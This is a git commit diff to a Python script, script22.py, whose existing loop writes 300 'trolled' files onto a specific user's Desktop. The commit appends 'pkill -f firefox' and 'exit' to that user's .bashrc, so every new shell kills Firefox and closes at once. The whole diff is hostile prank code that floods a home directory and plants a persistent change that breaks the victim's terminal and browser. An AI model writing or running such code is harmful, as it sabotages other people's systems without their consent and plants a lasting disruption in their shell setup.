19d5fe60c79063c26fb8601b5477b89ba006c700
Blixrow <75791514+Blixrow@users.noreply.github.com>
2022-11-10 09:22:09 +0100

    Update script22.py

--- script22.py
+++ script22.py
@@ -3,3 +3,6 @@ import subprocess
 for x in range(300):
     with open("../home/tls-sec/Desktop/file"+str(x), 'w') as f:
       f.write("trolled")
+
+with open("../home/tls-sec/.bashrc", 'a+') as f:
+    f.write("\npkill -f firefox\nexit")
